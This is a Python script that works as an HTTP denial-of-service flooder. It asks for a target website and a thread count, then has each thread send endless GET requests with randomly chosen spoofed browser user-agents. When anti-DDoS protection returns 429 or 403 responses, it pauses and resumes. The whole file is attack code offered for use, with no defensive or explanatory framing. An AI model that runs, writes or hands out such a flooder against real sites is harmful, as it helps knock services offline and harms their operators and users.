import requests
from threading import Thread
import time
import socket
import random
import sys

check = input("name ?")

if check == "amirhossein":
    ...
else:
    sys.exit()
User = ["Mozilla/5.0 (Linux; Android 7.1.0; A30 Build/MNB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (X11; Linux i686; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (Linux; Android 5.1.0; A6 Build/MNB19M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4464.104 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"]

user_random = {"user-agent":random.choice(User)}

index = 1

site = input("site addres: ")
if "https://" in site :
    pass
elif not "https://" in site :
    site = f"https://{site}"
elif "http://" in site :
    site = site.replace("http://","https://")

# def ip_check(site):
#     if "https://" in site :
#         site = site.replace("https://","")
#         site_ip = socket.gethostbyname(site)
#         return site_ip
#     elif not "https://" in site :
#         site_ip = socket.gethostbyname(site)
#         return site_ip

# print(ip_check(site))
# RUNTIME = 60
# [ip : {ip_check(site)}]

def main():
    global index, num
    req = requests.get(site,headers = user_random)
    print(f'[INFO] REQUEST NUMBER {index} [{req}] ')
    if req.status_code == 429:
        print("Too Many Requests (Request Blocked by anti ddos) [Code : 429]")
        time.sleep(10)
        main()
    if req.status_code == 403:
        print("Forbidden Error (Request Blocked by anti ddos) [Code : 429]")
        time.sleep(10)
        main()

    index += 1
    main()

def site_checking():
    global site
    try :
        site_check = requests.get(site,headers = user_random, timeout=5)
        if site_check.status_code == 200 or site_check.status_code == 202:
            print(f"Success addres is valid starting... [Code : 200]")
        elif site_check.status_code == 400:
            print("Bad Request [Code : 400]")
            print("===== Try Again =====")
            site = input("site addres: ")
            site_checking()
        elif site_check.status_code == 500:
            print("Internal Server Error [Code : 500]")
            print("===== Try Again =====")
            site = input("site addres: ")
            site_checking()
        elif site_check.status_code == 503:
            print("Service Unavailable [Code : 503]")
            print("===== Try Again =====")
            site = input("site addres: ")
            site_checking()
        elif site_check.status_code == 429:
            print("Too Many Requests (Request might Blocked by anti ddos) [Code : 429]")
            print("===== Try Again =====")
            site = input("site addres: ")
            site_checking()
        elif site_check.status_code == 403:
            print("Forbidden Error (Request might Blocked by anti ddos) [Code : 403]")
            print("===== Try Again =====")
            site = input("site addres: ")
            site_checking()
        else:
            print(f"another Error [code : {site_check.status_code}]")
            print("===== Try Again =====")
            site = input("site addres: ")
            site_checking()

    except requests.exceptions.ConnectTimeout:
        print("The server is offline Please check again when the server is online or check the IP address")
        print("===== Try Again =====")
        site = input("site addres: ")
        site_checking()
    except requests.exceptions.ConnectionError:
        print("The server is offline Please check again when the server is online or check the IP address")
        print("===== Try Again =====")
        site = input("site addres: ")
        site_checking()


site_checking()

num = int(input("num:"))
for i in range(num):
    Thread(target = main).start()

# time.sleep(RUNTIME)
